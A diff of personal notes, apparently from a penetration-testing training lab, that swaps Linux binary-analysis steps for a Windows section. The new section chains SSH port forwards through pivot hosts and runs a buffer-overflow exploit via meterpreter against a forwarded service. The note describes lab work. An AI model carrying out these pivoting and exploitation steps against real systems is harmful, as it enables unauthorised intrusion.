@@ -121,17 +121,13 @@ ON MACHINE BEING EXPLOITED
 21. sudo ./inventory.exe <<< $(python lin_buf.py)
       if it errors out re-generate payload
 
+--- WINDOWS ---
 1. ssh student@10.50.39.165 -L 3001:localhost:22 -NT
-2. ssh -p 3001 student@localhost -L 3002:192.168.28.105:2222 -NT
-3. ssh -p 3002 comrade@localhost
-ON LINOPS
-4. scp -P 3002 comrade@localhost:/.hidden/inventory2.exe .
-5. gdb inventory2.exe
-      pdisass main
-            pdisass message
-                  pdisass recv
-6.            
-
+2. ssh -p 3001 student@localhost -L 3002:192.168.28.120:4242 -NT
+3. ssh -p 3002 student@localhost -L 3003:192.168.150.245:9999 -NT
+4. change the script to the ip address localhost and the port to 3003
+5. run the expliot in meterpreter (check notes for set up)
+6. run the script
 
 
 
